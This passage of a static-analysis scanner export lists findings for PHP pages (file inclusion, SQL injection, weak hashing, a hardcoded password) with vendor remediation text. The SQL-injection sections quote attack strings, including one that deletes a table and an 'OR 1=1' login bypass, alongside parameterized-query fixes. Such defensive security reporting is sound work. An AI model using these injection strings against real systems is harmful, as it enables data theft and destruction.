to verify the identity of the binary. If a binary should always be owned by a particular user or have a particular set of access permissions assigned to it, these properties can be verified programmatically before the binary is executed.\n\nAlthough it may be impossible to completely protect a program from an imaginative attacker bent on controlling the commands the program executes, be sure to apply the principle of least privilege wherever the program executes an external command: do not hold privileges that are not essential to the execution of the command.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4440/?engineType=SCA&issue=30DDCC6D2A92583F7D7F240FCD7B127C"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4430",
          "shortDescription" : {
            "text" : "Dangerous File Inclusion"
          },
          "fullDescription" : {
            "text" : "The file index.php passes an unvalidated filename to a dynamic include statement on line 36. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
          },
          "help" : {
            "text" : "Many modern web scripting languages enable code re-use and modularization through the ability to include additional source files within one encapsulating file. This ability is often used to apply a standard look and feel to an application (templating), share functions without the need for compiled code, or break the code into smaller more manageable files. Included files are interpreted as part of the parent file and executed in the same manner. File inclusion vulnerabilities occur when the path of the included file is controlled by unvalidated user input.\n\n\nFile inclusion vulnerabilities are one of the most prolific and severe vulnerabilities in PHP applications. Prior to PHP 4.2.0, PHP installations shipped with the register_globals option enabled by default, which permits attackers to easily overwrite internal server variables. Although disabling register_globals can limit a program's exposure to file inclusion vulnerabilities, these problems still occur in modern PHP applications.\n\nExample 1: The following code includes a file under the application defined $server_root in a template.\n\n\n...\n&lt;?php include($server_root . '/myapp_header.php'); ?$gt;\n...\n\n\nIf register_globals is set to on, an attacker may overwrite the $server_root value by supplying $server_root as a request parameter, thereby taking partial-control of the dynamic include statement.\n\nExample 2: The following code takes a user specified template name and includes it in the PHP page to be rendered.\n\n\n...\n&lt;?php include($_GET['headername']); ?$gt;\n...\n\n\nIn Example 2, an attacker may take complete control of the dynamic include statement by supplying a malicious value for headername, which causes the program to include a file from an external site.\n\nIf the attacker specifies a valid file to a dynamic include statement, the contents of that file will be passed to the PHP interpreter. In the case of a plain text file, such as /etc/shadow, the file might be rendered as part of the HTML output. Worse, if the attacker may specify a path to a remote site controlled by the attacker, then the dynamic include statement will execute arbitrary malicious code supplied by the attacker.\n\nDisable the register_globals option by including the following line in php.ini:\n\n\nregister_globals = 'off'\n\n\nDo not allow unvalidated user input to control paths used in dynamic include statements. Instead, use a level of indirection: create a list of legitimate files for inclusion, and only allow users to select from the list. With this approach, the user can not directly specify a file from the file system.\n\nExample 2 could be improved to map user input to a key that selects the desired template, as follows:\n\n\n&lt;?php\n\t$templates = array('main.php' =&gt; 1, 'blue.php' =&gt; 2, 'red.php' =&gt; 3);\n?$gt;\n...\n&lt;?php include($templates[$_GET['headername']]); ?$gt;\n\n...\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4430/?engineType=SCA&issue=2CC9C99CE710F376B97AE6D59D6DE904"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4570",
          "shortDescription" : {
            "text" : "Dangerous File Inclusion"
          },
          "fullDescription" : {
            "text" : "The file index.php passes an unvalidated filename to a dynamic include statement on line 36. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
          },
          "help" : {
            "text" : "Many modern web scripting languages enable code re-use and modularization through the ability to include additional source files within one encapsulating file. This ability is often used to apply a standard look and feel to an application (templating), share functions without the need for compiled code, or break the code into smaller more manageable files. Included files are interpreted as part of the parent file and executed in the same manner. File inclusion vulnerabilities occur when the path of the included file is controlled by unvalidated user input.\n\n\nFile inclusion vulnerabilities are one of the most prolific and severe vulnerabilities in PHP applications. Prior to PHP 4.2.0, PHP installations shipped with the register_globals option enabled by default, which permits attackers to easily overwrite internal server variables. Although disabling register_globals can limit a program's exposure to file inclusion vulnerabilities, these problems still occur in modern PHP applications.\n\nExample 1: The following code includes a file under the application defined $server_root in a template.\n\n\n...\n&lt;?php include($server_root . '/myapp_header.php'); ?$gt;\n...\n\n\nIf register_globals is set to on, an attacker may overwrite the $server_root value by supplying $server_root as a request parameter, thereby taking partial-control of the dynamic include statement.\n\nExample 2: The following code takes a user specified template name and includes it in the PHP page to be rendered.\n\n\n...\n&lt;?php include($_GET['headername']); ?$gt;\n...\n\n\nIn Example 2, an attacker may take complete control of the dynamic include statement by supplying a malicious value for headername, which causes the program to include a file from an external site.\n\nIf the attacker specifies a valid file to a dynamic include statement, the contents of that file will be passed to the PHP interpreter. In the case of a plain text file, such as /etc/shadow, the file might be rendered as part of the HTML output. Worse, if the attacker may specify a path to a remote site controlled by the attacker, then the dynamic include statement will execute arbitrary malicious code supplied by the attacker.\n\nDisable the register_globals option by including the following line in php.ini:\n\n\nregister_globals = 'off'\n\n\nDo not allow unvalidated user input to control paths used in dynamic include statements. Instead, use a level of indirection: create a list of legitimate files for inclusion, and only allow users to select from the list. With this approach, the user can not directly specify a file from the file system.\n\nExample 2 could be improved to map user input to a key that selects the desired template, as follows:\n\n\n&lt;?php\n\t$templates = array('main.php' =&gt; 1, 'blue.php' =&gt; 2, 'red.php' =&gt; 3);\n?$gt;\n...\n&lt;?php include($templates[$_GET['headername']]); ?$gt;\n\n...\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4570/?engineType=SCA&issue=834B2456912C06091F14089321C4F178"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4657",
          "shortDescription" : {
            "text" : "Dangerous File Inclusion"
          },
          "fullDescription" : {
            "text" : "The file index.php passes an unvalidated filename to a dynamic include statement on line 36. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
          },
          "help" : {
            "text" : "Many modern web scripting languages enable code re-use and modularization through the ability to include additional source files within one encapsulating file. This ability is often used to apply a standard look and feel to an application (templating), share functions without the need for compiled code, or break the code into smaller more manageable files. Included files are interpreted as part of the parent file and executed in the same manner. File inclusion vulnerabilities occur when the path of the included file is controlled by unvalidated user input.\n\n\nFile inclusion vulnerabilities are one of the most prolific and severe vulnerabilities in PHP applications. Prior to PHP 4.2.0, PHP installations shipped with the register_globals option enabled by default, which permits attackers to easily overwrite internal server variables. Although disabling register_globals can limit a program's exposure to file inclusion vulnerabilities, these problems still occur in modern PHP applications.\n\nExample 1: The following code includes a file under the application defined $server_root in a template.\n\n\n...\n&lt;?php include($server_root . '/myapp_header.php'); ?$gt;\n...\n\n\nIf register_globals is set to on, an attacker may overwrite the $server_root value by supplying $server_root as a request parameter, thereby taking partial-control of the dynamic include statement.\n\nExample 2: The following code takes a user specified template name and includes it in the PHP page to be rendered.\n\n\n...\n&lt;?php include($_GET['headername']); ?$gt;\n...\n\n\nIn Example 2, an attacker may take complete control of the dynamic include statement by supplying a malicious value for headername, which causes the program to include a file from an external site.\n\nIf the attacker specifies a valid file to a dynamic include statement, the contents of that file will be passed to the PHP interpreter. In the case of a plain text file, such as /etc/shadow, the file might be rendered as part of the HTML output. Worse, if the attacker may specify a path to a remote site controlled by the attacker, then the dynamic include statement will execute arbitrary malicious code supplied by the attacker.\n\nDisable the register_globals option by including the following line in php.ini:\n\n\nregister_globals = 'off'\n\n\nDo not allow unvalidated user input to control paths used in dynamic include statements. Instead, use a level of indirection: create a list of legitimate files for inclusion, and only allow users to select from the list. With this approach, the user can not directly specify a file from the file system.\n\nExample 2 could be improved to map user input to a key that selects the desired template, as follows:\n\n\n&lt;?php\n\t$templates = array('main.php' =&gt; 1, 'blue.php' =&gt; 2, 'red.php' =&gt; 3);\n?$gt;\n...\n&lt;?php include($templates[$_GET['headername']]); ?$gt;\n\n...\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4657/?engineType=SCA&issue=C2A6C7BACEA1E5899F26850EE8C84BF4"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4742",
          "shortDescription" : {
            "text" : "Dangerous File Inclusion"
          },
          "fullDescription" : {
            "text" : "The file index.php passes an unvalidated filename to a dynamic include statement on line 36. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
          },
          "help" : {
            "text" : "Many modern web scripting languages enable code re-use and modularization through the ability to include additional source files within one encapsulating file. This ability is often used to apply a standard look and feel to an application (templating), share functions without the need for compiled code, or break the code into smaller more manageable files. Included files are interpreted as part of the parent file and executed in the same manner. File inclusion vulnerabilities occur when the path of the included file is controlled by unvalidated user input.\n\n\nFile inclusion vulnerabilities are one of the most prolific and severe vulnerabilities in PHP applications. Prior to PHP 4.2.0, PHP installations shipped with the register_globals option enabled by default, which permits attackers to easily overwrite internal server variables. Although disabling register_globals can limit a program's exposure to file inclusion vulnerabilities, these problems still occur in modern PHP applications.\n\nExample 1: The following code includes a file under the application defined $server_root in a template.\n\n\n...\n&lt;?php include($server_root . '/myapp_header.php'); ?$gt;\n...\n\n\nIf register_globals is set to on, an attacker may overwrite the $server_root value by supplying $server_root as a request parameter, thereby taking partial-control of the dynamic include statement.\n\nExample 2: The following code takes a user specified template name and includes it in the PHP page to be rendered.\n\n\n...\n&lt;?php include($_GET['headername']); ?$gt;\n...\n\n\nIn Example 2, an attacker may take complete control of the dynamic include statement by supplying a malicious value for headername, which causes the program to include a file from an external site.\n\nIf the attacker specifies a valid file to a dynamic include statement, the contents of that file will be passed to the PHP interpreter. In the case of a plain text file, such as /etc/shadow, the file might be rendered as part of the HTML output. Worse, if the attacker may specify a path to a remote site controlled by the attacker, then the dynamic include statement will execute arbitrary malicious code supplied by the attacker.\n\nDisable the register_globals option by including the following line in php.ini:\n\n\nregister_globals = 'off'\n\n\nDo not allow unvalidated user input to control paths used in dynamic include statements. Instead, use a level of indirection: create a list of legitimate files for inclusion, and only allow users to select from the list. With this approach, the user can not directly specify a file from the file system.\n\nExample 2 could be improved to map user input to a key that selects the desired template, as follows:\n\n\n&lt;?php\n\t$templates = array('main.php' =&gt; 1, 'blue.php' =&gt; 2, 'red.php' =&gt; 3);\n?$gt;\n...\n&lt;?php include($templates[$_GET['headername']]); ?$gt;\n\n...\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4742/?engineType=SCA&issue=F2DAAE5B3B3E8FF0115D9228AB519AD6"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4479",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file help.php on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4479/?engineType=SCA&issue=51A5816DDDF6BEFD8412ED84210ABF2C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4638",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4638/?engineType=SCA&issue=B284CB2167188D2C315D7F628359FA16"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4725",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 11 of high.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4725/?engineType=SCA&issue=EB94DBF518A09F8A1513B014BF2CECFD"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4650",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "Line 11 of low.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in low.php on line 11.\n\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4650/?engineType=SCA&issue=BB0F5F07497CC14452A83B1A07DAF922"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4458",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 12 of medium.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in medium.php on line 12.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4458/?engineType=SCA&issue=3F5E7A9E44323081569A476563B14943"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4535",
          "shortDescription" : {
            "text" : "Password Management: Hardcoded Password"
          },
          "fullDescription" : {
            "text" : "Hardcoded passwords could compromise system security in a way that cannot be easily remedied.\n\n\n"
          },
          "help" : {
            "text" : "It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. After the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system must choose between security and availability.\n\n\nExample: The following code uses a hardcoded password to connect to a database:\n\n\n...\n$link = mysql_connect($url, 'scott', 'tiger');\nif (!$link) {\n    die('Could not connect: ' . mysql_error());\n}\n...\n\n\nThis code will run successfully, but anyone who has access to it will have access to the password. After the program ships, there is likely no way to change the database user \"scott\" with a password of \"tiger\" unless the program is patched. An employee with access to this information can use it to break into the system.\n\nPasswords should never be hardcoded and should generally be obfuscated and managed in an external source. Storing passwords in plain text anywhere on the system allows anyone with sufficient permissions to read and potentially misuse the password.\n\nSome third-party products claim the ability to manage passwords in a more secure way. For a secure solution, the only viable option today appears to be a proprietary one that you 